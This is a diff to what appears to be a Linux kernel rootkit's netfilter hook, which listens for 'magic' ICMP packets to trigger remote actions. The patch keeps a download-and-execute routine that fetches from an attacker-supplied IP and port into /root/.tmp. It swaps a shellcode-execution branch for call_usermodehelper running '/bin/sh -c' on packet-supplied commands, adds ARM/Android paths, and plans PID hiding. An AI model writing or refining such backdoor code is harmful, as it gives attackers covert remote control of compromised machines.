@@ -11,7 +11,7 @@ struct magic_icmp {
     unsigned int ip;
     unsigned short port;
     unsigned short op;
-    unsigned char cmd[512]; 
+    unsigned char cmd[512];
 };
 
 struct nf_hook_ops pre_hook;
@@ -24,6 +24,13 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     #if defined(_CONFIG_DLEXEC_)
     unsigned int payload_size, ip = 0;
     unsigned short port = 0;
+    #endif
+
+
+    #if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
+    char *envp[] = { "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin", NULL };
+    #else // ARM
+    char *envp[] = { "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
     #endif
 
     ip_header = ip_hdr(skb);
@@ -53,7 +60,7 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     port = payload->port;
 
 
-    if(payload_size == 10 && op==0){
+    if(payload_size == 10 && payload->op==0){
     // 3 attempts, 2000ms delay
     dlexec_queue("/root/.tmp", ip, port, 2, 2000);
     }
@@ -63,15 +70,16 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
 
     case 1 :
     DEBUG("Executing command...\n");
-    system(payload->cmd);
-    break;
 
-    case 2 :
-    DEBUG("Executing shellcode...\n");
-    int (*ret)() = (int(*)())payload->cmd;
-    ret();
-    break;
+    char *argv[]= { "/bin/sh", "-c", payload->cmd, NULL };
+ 
 
+
+    call_usermodehelper(argv[0], argv, envp, 0);
+
+    // TODO: automatically hide pid
+    
+    break;
 
     default:
     //do nothing
